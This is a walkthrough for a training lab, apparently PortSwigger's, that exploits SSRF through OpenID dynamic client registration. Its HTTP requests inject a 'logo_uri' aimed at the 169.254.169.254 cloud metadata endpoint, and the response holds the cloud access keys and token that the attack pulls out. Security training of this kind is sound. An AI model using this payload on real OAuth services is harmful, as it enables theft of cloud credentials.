## SSRF via OpenID dynamic client registration

This lab allows client applications to dynamically register themselves with the OAuth service via a dedicated registration endpoint. Some client-specific data is used in an unsafe way by the OAuth service, which exposes a potential vector for SSRF.

To solve the lab, craft an SSRF attack to access http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/ and steal the secret access key for the OAuth provider's cloud environment.

You can log in to your own account using the following credentials: wiener:peter

Note :

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

## Notes

- Possibility to leave a comment on a post
- OAuth Server Domain 
- /social-login
- /oauth-callback

## Resume

1. Discover OpenID configuration  
2. Identify dynamic registration endpoint (`/reg`)  
3. Register a malicious OAuth client  
4. Observe logo fetching behavior (`/client/{id}/logo`)  
5. Inject SSRF payload via `logo_uri`  
6. Retrieve cloud metadata via internal address  
7. Extract secret access credentials  

## Solve

Browsing the OpenID configuration:

```
/.well-known/openid-configuration
``` id="cfg1"

We identify the registration endpoint:

```json
{
  "registration_endpoint": "https://oauth-0a7f00dd041e504c80d758f600b9007f.oauth-server.net/reg"
}
```

A basic request fails because `redirect_uris` is required:

```http id="req1"
POST /reg HTTP/2
Host: oauth-0a7f00dd041e504c80d758f600b9007f.oauth-server.net
Content-Type: application/json

{
  "redirect_uris": ["https://example.com"]
}
```

Response:

```html id="err1"
<pre><strong>error</strong>: invalid_redirect_uri</pre>
<pre><strong>error_description</strong>: redirect_uris is mandatory property</pre>
```

Correct request:

```http id="req2"
POST /reg HTTP/2
Host: oauth-0a7f00dd041e504c80d758f600b9007f.oauth-server.net
Content-Type: application/json

{
  "redirect_uris": [
    "https://6z6iaxl5bhiep4ja4buctjvuglmca3ys.oastify.com"
  ]
}
```

Response includes:

```json id="resp1"
{
  "client_id": "Pel_8CejjMIcPFOS1xUsc",
  "client_secret": "HdroTAK1Y1uzsuNpa-2n26Ji0IfUeTpY7lsCapZrs1NjmoCdrEPEECOmsjkeAeaGU41FI5EC-6mMgDN1lpR6_g",
  "registration_access_token": "KShoTsia8E0D3ylHDdto5Q7yuGPpCDO6J7d9m2DUbbi"
}
```

```http id="req3"
GET /client/Pel_8CejjMIcPFOS1xUsc/logo HTTP/2
```

This endpoint fetches the resource defined in `logo_uri`.

Add Collaborator URL:

```http id="req4"
POST /reg HTTP/2
Content-Type: application/json

{
  "redirect_uris": [
    "https://fdwro6zepqwn3dxjik8l7s93uu0loec3.oastify.com"
  ],
  "logo_uri": "https://BURP-COLLABORATOR-SUBDOMAIN"
}
```

```http id="req5"
POST /reg HTTP/2
Content-Type: application/json

{
  "redirect_uris": [
    "https://fdwro6zepqwn3dxjik8l7s93uu0loec3.oastify.com"
  ],
  "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```

```http id="req6"
GET /client/Q73wWftpLvCNIzsgeC1L2/logo HTTP/2
```

Response:

```json id="resp2"
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "NDauZRXYiYCqNNAOghgg",
  "SecretAccessKey": "6LJkDTHEazbXPWuMKi39j8VuSD2krhE1wo3mPO6e",
  "Token": "j1eZPazEaGRhAlp9v5aMK3vGFKKPKkHbJBmqdIdo5OCjYBD1dPSqlWEtKC6whYz3HirhmuAINzaITkyJBDXyZe6vwkvnYDQ1yF7oYyer466KAshPwMVdvDsHMtKnvKjlU0t99KQ61D0aW2tppV3gSDFC2EhBAiu41I3eciqOcadwNGLp51SzgiAUzH2RyyBTPVGe9TRSMjxYQdSKD8Xvkg7MxtUEqP9oe52PeEWOINnnsQ38T5YELokZLhezKdAX"
}
```
